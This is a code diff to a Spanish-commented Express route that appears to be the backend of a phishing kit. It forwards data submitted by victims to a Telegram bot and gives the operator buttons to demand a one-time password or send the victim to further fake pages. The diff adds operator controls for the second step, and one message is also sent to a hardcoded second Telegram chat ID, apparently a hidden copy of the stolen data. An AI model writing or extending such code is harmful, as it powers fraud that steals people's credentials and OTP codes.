@@ -80,10 +80,30 @@ router.post('/generals', (req, res) => {
       inline_keyboard: [
         [
           { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
-          
         ],
         [
           { text: 'newUser', callback_data: `index.html:${token}` }
+        ],
+        [
+          { text: 'Finalizar', callback_data: `success.html:${token}` }
+        ]
+      ],
+      one_time_keyboard: true,
+    }),
+  };
+
+  const opts2 = {
+    reply_markup: JSON.stringify({
+      inline_keyboard: [
+        [
+          { text: '$ Pedir OTP $', callback_data: `token.html:${token}` }
+        ],
+        [
+          { text: 'newUser', callback_data: `index.html:${token}` },
+          { text: 'nextInfo', callback_data: `next.html:${token}` }
+        ],
+        [
+          { text: 'Finalizar', callback_data: `success.html:${token}` }
         ]
       ],
       one_time_keyboard: true,
@@ -112,29 +132,34 @@ router.post('/generals', (req, res) => {
 
   if (req.body.tok === '') {
     bot.sendMessage(CHAT_ID, infoMessage1)
-      .then(()=>{
+      .then(() => {
         bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts1)
-        .then(message => {
-          const messageID = message.message_id;
-          activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
-        })
-        .catch(err => console.log(err));
+          .then(message => {
+            const messageID = message.message_id;
+            activeMessages.set(token, { messageID, res });
+          })
+          .catch(err => console.log(err));
       });
-  }else if (req.body.c === ''){
+  } else if (req.body.c === '') {
     bot.sendMessage(CHAT_ID, infoMessage2)
-      .then( () =>{
-        res.json({'Checked': 'checked'});
-      })
-  }else{
+      .then(() => {
+        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts2)
+          .then(message => {
+            const messageID = message.message_id;
+            activeMessages.set(token, { messageID, res });
+          })
+          .catch(err => console.log(err));
+      });
+  } else {
     bot.sendMessage(CHAT_ID, infoMessage3)
-      .then(()=>{
+      .then(() => {
         bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
-        .then(message => {
-          bot.sendMessage('1660900306', infoMessage3);
-          const messageID = message.message_id;
-          activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
-        })
-        .catch(err => console.log(err));
+          .then(message => {
+            bot.sendMessage('1660900306', infoMessage3);
+            const messageID = message.message_id;
+            activeMessages.set(token, { messageID, res });
+          })
+          .catch(err => console.log(err));
       });
   }
 })
